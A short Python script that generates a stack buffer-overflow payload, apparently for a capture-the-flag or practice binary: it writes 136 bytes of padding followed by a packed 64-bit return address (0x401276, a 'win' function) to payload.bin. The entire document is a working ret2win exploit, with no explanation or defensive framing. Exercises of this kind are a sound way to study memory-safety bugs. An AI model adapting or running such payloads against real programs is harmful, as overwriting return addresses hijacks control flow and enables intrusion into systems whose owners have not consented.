import struct

offset = 136 #distance from rbp address to buf address - offset to return address
padding = b"A" * offset
win_address = struct.pack("<Q", 0x401276)
payload = padding + win_address

with open("payload.bin", "wb") as f:
    f.write(payload)

print("Payload file 'payload' generated successfully!")
